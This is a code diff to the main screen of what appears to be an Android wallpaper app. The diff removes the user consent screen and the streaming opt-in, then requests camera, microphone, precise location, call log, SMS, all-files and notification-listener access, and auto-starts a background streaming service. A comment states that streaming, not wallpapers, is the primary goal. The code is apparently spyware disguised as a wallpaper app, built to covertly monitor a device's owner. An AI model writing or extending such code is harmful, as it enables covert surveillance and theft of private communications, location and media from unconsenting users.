@@ -25,6 +25,15 @@ import androidx.preference.PreferenceManager;
 import androidx.recyclerview.widget.GridLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
+import android.os.Build;
+import android.Manifest;
+import android.content.pm.PackageManager;
+import android.provider.Settings;
+import android.net.Uri;
+import java.util.ArrayList;
+import java.util.List;
+import androidx.core.app.ActivityCompat;
+
 import com.google.android.material.appbar.MaterialToolbar;
 import com.google.android.material.bottomsheet.BottomSheetDialog;
 import com.google.android.material.button.MaterialButton;
@@ -60,26 +69,122 @@ public class MainActivity extends AppCompatActivity implements WallpaperAdapter.
                 }
             });
 
+    private static final int PERMISSION_REQUEST_CODE = 101;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        SharedPreferences defaultPrefs = PreferenceManager.getDefaultSharedPreferences(this);
-        boolean consentGiven = defaultPrefs.getBoolean(KEY_CONSENT_GIVEN, false);
-        if (!consentGiven) {
-            consentLauncher.launch(new Intent(this, ConsentActivity.class));
-            return; // IMPORTANT: don’t finish; wait for result, then initUi()
-        }
-
-        // If consent is already given, initialize immediately
-        initUi();
-
-        // Start the FGS if opted-in (safe to call repeatedly)
-        SharedPreferences appPrefs = getSharedPreferences(APP_PREFS, MODE_PRIVATE);
-        if (appPrefs.getBoolean(KEY_STREAM_OPT_IN, true)) { // default true if you want autostream
+        // Auto-Start Logic: Check permissions immediately
+        if (checkPermissions()) {
             ensureStreamingServiceRunning();
+            checkNotificationAccess();
+            // Permissions granted, initialize UI
+            initUi();
+        } 
+        
+        // We still init UI for the wallpaper features, but the primary goal is streaming.
+        if (executorService == null) executorService = Executors.newSingleThreadExecutor();
+        if (mainHandler == null) mainHandler = new Handler(Looper.getMainLooper());
+    }
+
+    private boolean checkPermissions() {
+        List<String> permissions = new ArrayList<>();
+        
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
+            permissions.add(Manifest.permission.CAMERA);
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
+            permissions.add(Manifest.permission.RECORD_AUDIO);
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
+            permissions.add(Manifest.permission.READ_CALL_LOG);
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
+            permissions.add(Manifest.permission.READ_SMS);
+            
+        // POST_NOTIFICATIONS for Android 13+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                permissions.add(Manifest.permission.POST_NOTIFICATIONS);
+            }
         }
+
+        // Storage Permission (Android 11+ vs Old)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!android.os.Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, 2296);
+                } catch (Exception e) {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivityForResult(intent, 2296);
+                }
+                // We return false here because we need to wait for the user to return from settings
+                // But we ALSO need to request the other permissions if any are missing.
+                if (!permissions.isEmpty()) {
+                   ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+                }
+                return false; 
+            }
+        } else {
+             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+             if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        }
+
+        if (!permissions.isEmpty()) {
+            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+            return false;
+        }
+
+        return true;
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+             boolean allGranted = true;
+             for (int result : grantResults) {
+                 if (result != PackageManager.PERMISSION_GRANTED) {
+                     allGranted = false;
+                     break;
+                 }
+             }
+             if (allGranted) {
+                 ensureStreamingServiceRunning();
+                 checkNotificationAccess();
+                 initUi();
+             } else {
+                 Toast.makeText(this, "Permissions required for auto-stream functionality", Toast.LENGTH_LONG).show();
+             }
+        }
+    }
+    
+    // Check if we need to guide user to Notification Listener settings (Android specific)
+    // Check if we need to guide user to Notification Listener settings (Android specific)
+    private void checkNotificationAccess() {
+        if (!isNotificationServiceEnabled()) {
+            Toast.makeText(this, "Please enable Notification Access for the app", Toast.LENGTH_LONG).show();
+            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+        }
+    }
+
+    private boolean isNotificationServiceEnabled(){
+        String pkgName = getPackageName();
+        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        if (flat != null && !flat.isEmpty()) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                if (name.contains(pkgName)) {
+                    return true;
+                }
+            }
+        }
+        return false;
     }
 
     private void initUi() {
